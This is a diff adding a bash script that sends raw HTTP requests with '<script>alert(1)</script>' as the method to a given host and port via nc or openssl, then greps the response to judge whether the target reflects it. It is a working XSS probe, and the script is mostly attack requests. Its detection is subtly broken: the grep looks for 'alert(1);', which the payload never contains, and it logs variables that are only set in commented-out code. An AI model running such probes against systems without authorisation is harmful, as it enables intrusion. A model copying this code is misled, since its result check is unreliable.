@@ -1,0 +1,61 @@
+#!/bin/bash
+
+CMDNAME=`basename $0`
+LOGPATH="./log/"
+#OUTFILE="$LOGPATH$RESULT"
+
+if [ $# -ne 3 ]; then
+    echo "#### Error ####"
+    echo "Usage: $CMDNAME {ipaddress} {port} [http or https]" 1>&2
+    echo "Example: $CMDNAME 192.168.1.1 443 https"
+    exit 1
+fi
+
+if [ ! -d $LOGPATH ]; then
+    mkdir $LOGPATH
+fi
+
+if [ $3 = "http" ]; then
+    COMMAND="nc $1 $2"
+    #CURL="curl -H \"Expect: <script>alert(1);</script>\" -isk  http://$1:$2/"
+    RESULT="$2_http_methodxss_$1_`date "+%Y%m%d%H%M"`.txt"
+    OUTFILE="$LOGPATH$RESULT"
+fi
+
+if [ $3 = "https" ]; then
+    COMMAND="openssl s_client -connect $1:$2"
+    #CURL="curl -H \"Expect: <script>alert(1);</script>\" -isk  http://$1:$2/"
+    RESULT="$2_https_methodxss_$1_`date "+%Y%m%d%H%M"`.txt"
+    OUTFILE="$LOGPATH$RESULT"
+fi
+
+HDR1="User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
+HDR2="Connection: close"
+
+#echo -e "\r\n\r\n********* Expect1 curl command ********" > $OUTFILE 2>&1
+#echo -e "# $CURL" >> $OUTFILE 2>&1 
+#$CURL >> $OUTFILE | echo 2>&1 
+
+echo -e "\r\n\r\n********* Method XSS1 HTTP/1.0 ********" >> $OUTFILE 2>&1
+echo -e "# $COMMAND\r\n<script>alert(1)</script> / HTTP/1.0\r\nHost: $1\r\nContent-Length: 0\r\nContent-Length: 0\r\nContent-Length: 0\r\n$HDR1\r\n$HDR2\r\n\r\n" >> $OUTFILE 2>&1
+echo -e "<script>alert(1)</script> / HTTP/1.0\r\nHost: $1\r\nContent-Length: 0\r\nContent-Length: 0\r\nContent-Length: 0\r\n$HDR1\r\n$HDR2\r\n\r\n" | $COMMAND >> $OUTFILE 2>&1
+
+
+echo -e "\r\n\r\n********* Method XSS2 HTTP/1.1 ********" >> $OUTFILE 2>&1
+echo -e "# $COMMAND\r\n<script>alert(1)</script> / HTTP/1.1\r\nHost: $1\r\nContent-Length: 0\r\nContent-Length: 0\r\nContent-Length: 0\r\n$HDR1\r\n$HDR2\r\n\r\n" >> $OUTFILE 2>&1
+RESPONSE1=`echo -e "<script>alert(1)</script> / HTTP/1.1\r\nHost: $1\r\nContent-Length: 0\r\nContent-Length: 0\r\nContent-Length: 0\r\n$HDR1\r\n$HDR2\r\n\r\n" | $COMMAND 2>&1`
+echo "$RESPONSE1" >> $OUTFILE 2>&1
+
+#RESPONSE1=`echo -e "TRACE /$TARGET HTTP/1.1\r\nHost: $1\r\n$HDR1\r\n$HDR2\r\n\r\n" | $COMMAND`
+#RESPONSE2=`$CURL`
+
+if echo "$RESPONSE1" | grep "<script>alert(1);</script>" > /dev/null; then
+    echo "---- VULNERABLE ----" | tee $RESULT
+    echo -e "\r\n# $CURL" >> $RESULT
+    echo "$RESPONSE2" >> $RESULT
+else
+    echo "---- NOT VULNERABLE ----" | tee $RESULT
+fi
+
+exit 
+
